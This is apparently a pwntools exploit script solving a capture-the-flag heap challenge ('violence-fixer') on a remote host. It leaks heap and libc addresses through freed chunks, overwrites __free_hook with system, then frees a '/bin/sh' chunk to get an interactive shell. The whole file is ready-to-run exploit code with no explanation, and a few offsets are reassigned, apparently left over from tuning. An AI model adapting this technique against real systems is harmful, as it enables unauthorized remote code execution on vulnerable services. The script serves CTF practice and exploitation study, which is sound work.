from pwn import *

#r = process("./violence-fixer", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("35.221.81.216",32112)
r.recvuntil(": ")
r.sendline("y")

def rec():
    return r.recvuntil("> ")
rec()

def alloc(size, content):
    r.sendline("1")
    r.sendlineafter(": ", str(size))
    r.sendafter(": ", content)
    rec()

def show(idx):
    r.sendline("2")
    r.sendlineafter(": ", str(idx))
    return rec()

def free(idx):
    r.sendline("3")
    r.sendlineafter(": ", str(idx))
    rec()

alloc(0x40, "A"*0x40)
alloc(0x40, "B"*0x40)
free(0)
free(1)
alloc(0x40, "C") # 0
alloc(0x40, "D") # 1
heap = u64(show(1)[:6] + "\x00"*2)
print(hex(heap))

for i in range(8):
    alloc(0x80, "C"*0x80)
for i in range(3, 3+7):
    free(i)
free(2)
alloc(0x80, "\x40") # 2
libc = u64(show(2)[:6] + "\x00"*2) - 0x1c0a40 - 0x100 - 0x2b000
mallochook = libc + 0x1c09d0
freehook = libc + 0x1c3cd0
freehook = libc + 0x1eeb28
system = libc + 0x496e0
system = libc + 0x55410

print(hex(libc))
pause()

alloc(0x80, "/bin/sh\x00") #3
alloc(0x80, p64(0x43434343)) #4
alloc(0x80, p64(freehook)) #5
alloc(0x80, p64(0x45454545)) #6

r.sendline("")
r.recvuntil("???>")
r.sendline("y")
r.recvuntil(":")
r.sendline(str(0x80))
r.recvuntil(":")
r.sendline(p64(system))
rec()

r.sendline("3")
r.recvuntil(":")
r.sendline("3")

#alloc(0x80, "A"*8) #7

#for i in range(7):
    #print(i)
    #alloc(0x80, "A"*0x80)

r.interactive()



